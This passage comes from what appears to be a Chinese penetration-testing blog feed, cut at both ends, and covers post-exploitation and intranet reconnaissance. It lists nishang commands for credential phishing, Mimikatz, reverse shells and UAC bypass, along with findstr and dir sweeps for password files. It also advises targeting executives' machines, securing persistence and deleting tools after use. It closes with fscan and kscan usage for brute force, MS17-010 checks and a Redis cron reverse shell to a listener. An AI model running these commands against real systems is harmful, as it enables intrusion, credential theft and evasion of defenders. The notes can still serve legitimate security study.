posershell脚本名 <span class="hljs-regexp">//</span>执行脚本<br>beacon&gt; powershell Check-VM <span class="hljs-regexp">//</span>执行命令<br></code></pre></td></tr></table></figure><img src="/img/image-20231008103624188.png" alt="image-20231008103624188" style="zoom:80%;" /><p><img src="/img/image-20231008103855355.png" alt="image-20231008103855355"></p><p><strong>PowerView.ps1 命令：</strong></p><table><thead><tr><th>Get-NetDomain</th><th>获取当前用户所在的域名称</th></tr></thead><tbody><tr><td>Get-NetUser</td><td>返回所有用户详细信息</td></tr><tr><td>Get-NetDomainController</td><td>获取所有域控制器</td></tr><tr><td>Get-NetComputer</td><td>获取所有域内机器详细信息</td></tr><tr><td>Get-NetOU</td><td>获取域中OU信息</td></tr><tr><td>Get-NetGroup</td><td>获取所有域内组和组成员信息</td></tr><tr><td>Get-NetFileServer</td><td>根据SPN获取当前域使用的文件服务器</td></tr><tr><td>Get-NetShare</td><td>获取当前域内所有网络共享</td></tr><tr><td>Get-NetSession</td><td>获取在指定服务器存在的Session信息</td></tr><tr><td>Get-NetRDPSession</td><td>获取在指定服务器存在的远程连接信息</td></tr><tr><td>Get-NetProcess</td><td>获取远程主机的进程信息</td></tr><tr><td>Get-UserEvent</td><td>获取指定用户日志信息</td></tr><tr><td>Get-ADObject</td><td>获取活动目录的对象信息</td></tr><tr><td>Get-NetGPO</td><td>获取域所有组策略对象</td></tr><tr><td>Get-DomainPolicy</td><td>获取域默认或域控制器策略</td></tr><tr><td>Invoke-UserHunter</td><td>搜索网络中域管理员正在使用的主机</td></tr><tr><td>Invoke-ProcessHunter</td><td>查找域内所有机器进程用于找到某特定用户</td></tr><tr><td>Invoke-UserEventHunter</td><td>根据用户日志获取某域用户登陆过哪些域机器</td></tr></tbody></table><h3 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a>nishang</h3><p>Nishang是一款针对PowerShell的渗透工具</p><p><img src="/img/image-20231008104006635.png" alt="image-20231008104006635"></p><h4 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h4><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-number">1.</span>放在<span class="hljs-variable">cs</span>目录<br><span class="hljs-variable">powershell</span><span class="hljs-operator">-</span><span class="hljs-variable">import</span> <span class="hljs-variable">nishang</span><span class="hljs-operator">/</span><span class="hljs-variable">nishang</span><span class="hljs-operator">.</span><span class="hljs-variable">psm1</span><br><span class="hljs-variable">powershell</span> <span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">Command</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-variable">nishang</span><br><span class="hljs-number">2.</span>上传到靶机<br><span class="hljs-variable">shell</span> <span class="hljs-variable">powershell</span> <span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">nishang</span>\<span class="hljs-variable">nishang</span><span class="hljs-operator">.</span><span class="hljs-variable">psm1</span><span class="hljs-operator">;</span><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">Command</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-variable">nishang</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231008104859869.png" alt="image-20231008104859869"></p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Check</span><span class="hljs-operator">-</span><span class="hljs-variable">VM</span> 检测该主机是不是虚拟机<br><span class="hljs-variable">Invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">CredentialsPhish</span> 欺骗用户，让用户输入密码<br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">WLAN</span><span class="hljs-operator">-</span><span class="hljs-built_in">Keys</span> <span class="hljs-variable">wifi</span> 信息<br><span class="hljs-variable">Invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">Mimikatz</span> 抓密码<br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">PassHashes</span> 获取<span class="hljs-variable">hash</span><br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">PassHints</span> 获取用户的密码提示信息<br><span class="hljs-variable">Invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">PowerShellTcp</span> 反弹<span class="hljs-variable">shell</span><br><span class="hljs-variable">Invoke</span><span class="hljs-operator">-</span><span class="hljs-variable">PsUACme</span> 绕过<span class="hljs-variable">UAC</span><br><span class="hljs-built_in">Remove</span><span class="hljs-operator">-</span><span class="hljs-built_in">Update</span> 删除补丁<br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-built_in">Information</span> 本机信息<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231008105107650.png" alt="image-20231008105107650"></p><h2 id="7-定位计算机中的敏感数据"><a href="#7-定位计算机中的敏感数据" class="headerlink" title="7.定位计算机中的敏感数据"></a>7.定位计算机中的敏感数据</h2><p>内网的核心敏感数据，不仅包括数据库、电子邮件，还包括个人数据及组织的业务数据、技术数据等。可以说，价值较高的数据基本都在内网中。</p><p>资料、数据、文件的定位流程：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">定位内部人事组织结构<br>在内部人事组织结构中寻找需要监视的人员<br>定位相关人员的机器<br>视相关人员存放文档的位置<br>列出存放文档的服务器的目录<br></code></pre></td></tr></table></figure><p>重点核心业务机器</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">高级管理人员 系统管理人员 财务<span class="hljs-regexp">/人事/</span>业务人员的个人计算机<br>产品管理系统服务器<br>办公系统服务器<br>财务应用系统服务器<br>核心产品源码服务器（SVN/GIT服务器）<br>数据库服务器<br>文件服务器，<br>共享服务器<br>电子邮件服务器<br>网站监控系统服务器<br>信息安全监控服务器<br>生产工厂服务器<br></code></pre></td></tr></table></figure><p>敏感信息和敏感文件</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs crystal">站点源码备份文件，<br>数据库备份文件等等<br>游览器保存的密码和浏览器的cookie<br>其他用户会话，<br><span class="hljs-number">3389</span>和ipc<span class="hljs-variable">$连</span>接记录，<br>回收站中的信息等等<br>Windows的无线密码<br>网络内部的各种账号密码，<br>包含电子邮箱，V**，FTP等等<br></code></pre></td></tr></table></figure><p>在内网中,我们一定要知道自己拿下的机器的人员的职位（职位高的人在内网中权限也高，计算机中的敏感信息也多，还有一种就是特殊职位的人员，例如上面说的，一般都有一些与职位相关的敏感信息。）还有就是拿下一台机器后要先维权，权限稳了再收集信息，信息收集一定要全面仔细，信息收 集完了再搞内网。往目标主机中传工具用完就删。翻文件的话，可以使用一些搜索命令来快速寻找。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">1.指定目录下搜集各类敏感文件<br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*.txt&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> C:\<span class="hljs-string">&quot;*.xlsx&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*.md&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*.sql&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*.pdf&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*.docx&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*.doc&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*conf*&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*bak*&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*pwd*&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*pass*&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*login*&quot;</span><br>dir <span class="hljs-string">/a</span> <span class="hljs-string">/s</span> <span class="hljs-string">/b</span> d:\<span class="hljs-string">&quot;*user*&quot;</span><br>2.指定目录下的文件中搜集各种账号密码<br>findstr <span class="hljs-string">/si</span> pass *<span class="hljs-string">.inc</span> *<span class="hljs-string">.config</span> *<span class="hljs-string">.ini</span> *<span class="hljs-string">.txt</span> *<span class="hljs-string">.asp</span> *<span class="hljs-string">.aspx</span> *<span class="hljs-string">.php</span> *<span class="hljs-string">.jsp</span> *<span class="hljs-string">.xml</span> *<span class="hljs-string">.cgi</span> *<span class="hljs-string">.bak</span><br>findstr <span class="hljs-string">/si</span> userpwd *<span class="hljs-string">.inc</span> *<span class="hljs-string">.config</span> *<span class="hljs-string">.ini</span> *<span class="hljs-string">.txt</span> *<span class="hljs-string">.asp</span> *<span class="hljs-string">.aspx</span> *<span class="hljs-string">.php</span> *<span class="hljs-string">.jsp</span> *<span class="hljs-string">.xml</span> *<span class="hljs-string">.cgi</span> *<span class="hljs-string">.bak</span><br>findstr <span class="hljs-string">/si</span> <span class="hljs-keyword">pwd</span> *<span class="hljs-string">.inc</span> *<span class="hljs-string">.config</span> *<span class="hljs-string">.ini</span> *<span class="hljs-string">.txt</span> *<span class="hljs-string">.asp</span> *<span class="hljs-string">.aspx</span> *<span class="hljs-string">.php</span> *<span class="hljs-string">.jsp</span> *<span class="hljs-string">.xml</span> *<span class="hljs-string">.cgi</span> *<span class="hljs-string">.bak</span><br>findstr <span class="hljs-string">/si</span> login *<span class="hljs-string">.inc</span> *<span class="hljs-string">.config</span> *<span class="hljs-string">.ini</span> *<span class="hljs-string">.txt</span> *<span class="hljs-string">.asp</span> *<span class="hljs-string">.aspx</span> *<span class="hljs-string">.php</span> *<span class="hljs-string">.jsp</span> *<span class="hljs-string">.xml</span> *<span class="hljs-string">.cgi</span> *<span class="hljs-string">.bak</span><br>findstr <span class="hljs-string">/si</span> user *<span class="hljs-string">.inc</span> *<span class="hljs-string">.config</span> *<span class="hljs-string">.ini</span> *<span class="hljs-string">.txt</span> *<span class="hljs-string">.asp</span> *<span class="hljs-string">.aspx</span> *<span class="hljs-string">.php</span> *<span class="hljs-string">.jsp</span> *<span class="hljs-string">.xml</span> *<span class="hljs-string">.cgi</span> *<span class="hljs-string">.bak</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>后渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>内网信息搜集2-内网ip+端口扫描</title>
    <link href="/2023/10/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%862-%E5%86%85%E7%BD%91ip-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
    <url>/2023/10/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%862-%E5%86%85%E7%BD%91ip-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="1-内网IP扫描"><a href="#1-内网IP扫描" class="headerlink" title="1.内网IP扫描"></a>1.内网IP扫描</h2><h3 id="NetBIOS"><a href="#NetBIOS" class="headerlink" title="NetBIOS"></a>NetBIOS</h3><p>这是一款用于扫描Windows网络上NetBIOS名字信息的程序。该程序对给出范围内的每一个地址发送NetBIOS状态查询，并且以易读的表格列出接收到的信息，对于每个响应的主机，NBTScan列出它的IP地址、NetBIOS计算机名、登录用户名和MAC地址。但只能用于局域网,NBTSCAN可以取到 PC的真实IP地址和MAC地址，如果有”ARP攻击”在做怪，可以找到装有ARP攻击的PC的IP&#x2F;和 MAC地址。但只能用于局域网</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">下载地址 http:<span class="hljs-regexp">//</span>www.unixwiz.net<span class="hljs-regexp">/tools/</span>nbtscan.html<br>用法：nbtscan.exe + IP<br></code></pre></td></tr></table></figure><p>通过CS上传nbtscan</p><img src="/img/image-20231006104941588.png" alt="image-20231006104941588" style="zoom:67%;" /><p><img src="/img/image-20231006110217674.png" alt="image-20231006110217674"></p><h3 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h3><p>除了利用NetBIOS探测内网，还可以利用ICMP协议探测内网。依次对内网中的每个IP地址执行ping 命令，可以快速找出内网中所有存活酌主机。在渗透测试中中，可以使用如下命令循环探测整个C段</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> /L %I in (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) DO @ping -w <span class="hljs-number">1</span> -n <span class="hljs-number">1</span> <span class="hljs-number">10</span>.<span class="hljs-number">210</span>.<span class="hljs-number">100</span>.%I | findstr <span class="hljs-string">&quot;TTL=&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231006110347635.png" alt="image-20231006110347635"></p><h3 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm">使用arp协议进行<span class="hljs-built_in">IP</span>探测 借助工具arp.exe<br><span class="hljs-symbol">apr</span> -t <span class="hljs-built_in">IP</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231006110718853.png" alt="image-20231006110718853"></p><h3 id="Kscan"><a href="#Kscan" class="headerlink" title="Kscan"></a>Kscan</h3><p>kscan是一款资产]测绘工具，可针对指定资产进行端口扫描以及TCP指纹识别和Banner抓取，在不发送更多的数据包的情况下尽可能的获取端口更多信息。并能够针对扫描结果进行自动化暴力破解， 且是go平台首款开源的RDP暴力破解工具</p><p>下载地址 <a href="https://github.com/lcvvvv/kscan">https://github.com/lcvvvv/kscan</a></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">usage: kscan [-h,<span class="hljs-params">--help</span>,<span class="hljs-params">--fofa-syntax</span>] <span class="hljs-params">(-t,--target,-f,--fofa,--spy)</span> [-p,<span class="hljs-params">--port</span>|<span class="hljs-params">--top</span>] [-o,<span class="hljs-params">--output</span>] [-oJ] [<span class="hljs-params">--proxy</span>] [<span class="hljs-params">--threads</span>] [<span class="hljs-params">--path</span>] [<span class="hljs-params">--host</span>] [<span class="hljs-params">--timeout</span>] [-Pn] [-Cn] [-sV] [<span class="hljs-params">--check</span>] [<span class="hljs-params">--encoding</span>] [<span class="hljs-params">--hydra</span>] [hydra options] [fofa options]<br><br><br>optional arguments:<br>  -h , <span class="hljs-params">--help</span>     show this <span class="hljs-keyword">help</span> message and exit<br>  -f , <span class="hljs-params">--fofa</span>     从fofa获取检测对象，需提前配置环境变量<span class="hljs-function">:FOFA_EMAIL</span>、FOFA_KEY<br>  -t , <span class="hljs-params">--target</span>   指定探测对象：<br>                  IP地址：114.114.114.114<br>                  IP地址段：114.114.114.114/24,不建议子网掩码小于12<br>                  IP地址段：114.114.114.114-115.115.115.115<br>                  URL地址：https:<span class="hljs-string">//www.baidu.com</span><br>                  文件地址：file:<span class="hljs-string">/tmp/target.txt</span><br>  <span class="hljs-params">--spy</span>           网段探测模式，此模式下将自动探测主机可达的内网网段可接收参数为：<br>                  <span class="hljs-params">(空)</span>、192、10、172、all、指定IP地址<span class="hljs-params">(将探测该IP地址B段存活网关)</span><br>  <span class="hljs-params">--check</span>         针对目标地址做指纹识别，仅不会进行端口探测<br>  <span class="hljs-params">--scan</span>          将针对<span class="hljs-params">--fofa</span>、<span class="hljs-params">--spy</span>提供的目标对象，进行端口扫描和指纹识别<br>  -p , <span class="hljs-params">--port</span>     扫描指定端口，默认会扫描TOP400，支持：80,8080,8088-8090<br>  -eP, <span class="hljs-params">--excluded-port</span> 跳过扫描指定的端口，支持：80,8080,8088-8090<br>  -o , <span class="hljs-params">--output</span>   将扫描结果保存到文件<br>  -oJ             将扫描结果使用json格式保存到文件<br>  -Pn          使用此参数后，将不会进行智能存活性探测，现在默认会开启智能存活性探测，提高效率<br>  -Cn             使用此参数后，控制台输出结果将不会带颜色<br>  -Dn             使用此参数后，将关闭CDN识别功能<br>  -sV             使用此参数后，将对所有端口进行全探针探测，此参数极度影响效率，慎用！<br>  <span class="hljs-params">--top</span>           扫描经过筛选处理的常见端口TopX，最高支持1000个，默认为TOP400<br>  <span class="hljs-params">--proxy</span>         设置代理<span class="hljs-params">(socks5|socks4|https|http)</span>:<span class="hljs-string">//IP</span><span class="hljs-function">:Port</span><br>  <span class="hljs-params">--threads</span>       线程参数,默认线程100,最大值为2048<br>  <span class="hljs-params">--path</span>          指定请求访问的目录，只支持单个目录<br>  <span class="hljs-params">--host</span>          指定所有请求的头部Host值<br>  <span class="hljs-params">--timeout</span>       设置超时时间<br>  <span class="hljs-params">--encoding</span>      设置终端输出编码，可指定为：gb2312、utf-8<br>  <span class="hljs-params">--match</span>         对资产返回banner进行检索，存在关键字的，才会显示，否则不会显示<br>  <span class="hljs-params">--hydra</span>         自动化爆破支持协议：ssh,rdp,ftp,smb,mysql,mssql,oracle,postgresql,mongodb,redis,默认会开启全部<br>hydra options:<br>   <span class="hljs-params">--hydra-user</span>   自定义hydra爆破用户名<span class="hljs-function">:username</span> or user1,user2 or file<span class="hljs-function">:username.txt</span><br>   <span class="hljs-params">--hydra-pass</span>   自定义hydra爆破密码<span class="hljs-function">:password</span> or pass1,pass2 or file<span class="hljs-function">:password.txt</span><br>                  若密码中存在使用逗号的情况，则使用\,进行转义，其他符号无需转义<br>   <span class="hljs-params">--hydra-update</span> 自定义用户名、密码模式，若携带此参数，则为新增模式，会将用户名和密码补充在默认字典后面。否则将替换默认字典。<br>   <span class="hljs-params">--hydra-mod</span>    指定自动化暴力破解模块<span class="hljs-function">:rdp</span> or rdp,ssh,smb<br>fofa options:<br>   <span class="hljs-params">--fofa-syntax</span>  将获取fofa搜索语法说明<br>   <span class="hljs-params">--fofa-size</span>    将设置fofa返回条目数，默认100条<br>   <span class="hljs-params">--fofa-fix-keyword</span> 修饰keyword，该参数中的&#123;&#125;最终会替换成-f参数的值<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">kscan_win64<span class="hljs-selector-class">.exe</span> -t <span class="hljs-number">10.210</span>.<span class="hljs-number">100.0</span>/<span class="hljs-number">24</span> <span class="hljs-attr">--encoding</span> gb2312  扫描存活主机即端口 <br>kscan_win64<span class="hljs-selector-class">.exe</span> <span class="hljs-attr">--spy</span> <span class="hljs-attr">--encoding</span> gb2312  探测b段存活网关<br></code></pre></td></tr></table></figure><img src="/img/image-20231006141117410.png" alt="image-20231006141117410" style="zoom:80%;" /><h3 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h3><p>一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、 web漏洞扫描、netbios探测、域控识别等功能。</p><p><a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">24</span> -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)<br><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">24</span> -rf id_rsa.pub (redis 写公钥)<br><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">24</span> -rs <span class="hljs-number">192.168.1.1:6666</span> (redis 计划任务反弹shell)<br><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">24</span> -c whoami (ssh 爆破成功后，命令执行)<br><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">24</span> -m ssh -p <span class="hljs-number">2222</span> (指定模块ssh和端口)<br><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">24</span> -pwdf pwd.txt -userf users.txt (加载指定文件的用户名密码来进行爆破)<br><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">24</span> -o /tmp/<span class="hljs-number">1</span>.txt (指定扫描结果保存路径,默认保存在当前路径)<br><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">8</span> (A段的<span class="hljs-number">192</span>.x.x.<span class="hljs-number">1</span>和<span class="hljs-number">192</span>.x.x.<span class="hljs-number">254</span>,方便快速查看网段信息 )<br><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">24</span> -m smb -pwd password (smb密码碰撞)<br><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">24</span> -m ms17010 (指定模块)<br><span class="hljs-attribute">fscan</span>.exe -hf ip.txt (以文件导入)<br><span class="hljs-attribute">fscan</span>.exe -u http://baidu.com -proxy <span class="hljs-number">8080</span> (扫描单个url,并设置http代理 http://<span class="hljs-number">127.0.0.1:8080</span>)<br><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">24</span> -nobr -nopoc (不进行爆破,不扫Web poc,以减少流量)<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fscan_win32</span>.exe -h <span class="hljs-number">10.210.100.0</span>/<span class="hljs-number">24</span>  扫描网段存活主机 端口 漏洞探测<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231006143857897.png" alt="image-20231006143857897"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fscan_win32</span>.exe -h <span class="hljs-number">10.210.100.30</span> -m ms17010  漏洞探测<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231006144154124.png" alt="image-20231006144154124"></p><h3 id="ladon"><a href="#ladon" class="headerlink" title="ladon"></a>ladon</h3><p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段&#x2F;B段&#x2F;C段以及跨网段扫描，支持URL、主 机、域名列表扫描。7.5版本内置100个功能模块,外部模块18个,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间 件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、SMBGhost、Weblogic、 ActiveMQ、Tomcat、Struts2系列等，密码爆破13种含数据库(Mysql、Oracle、MSSQL)、FTP、 SSH、VNC、Windows(LDAP、SMB&#x2F;IPC、NBT、WMI、SmbHash、WmiHash、Winrm)、 BasicAuth、Tomcat、Weblogic、Rar等，远程执行命令包含(wmiexe&#x2F;psexec&#x2F;atexec&#x2F;sshexec &#x2F;jspshell),Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度 自定义插件POC支持.NET程序集、DLL(C#&#x2F;Delphi&#x2F;VC)、PowerShell等语言编写的插件,支持通过配 置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支 持Cobalt Strike插件化扫描快速拓展内网进行横向移动。</p><img src="/img/image-20231006145425528.png" alt="image-20231006145425528" style="zoom:80%;" /><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span 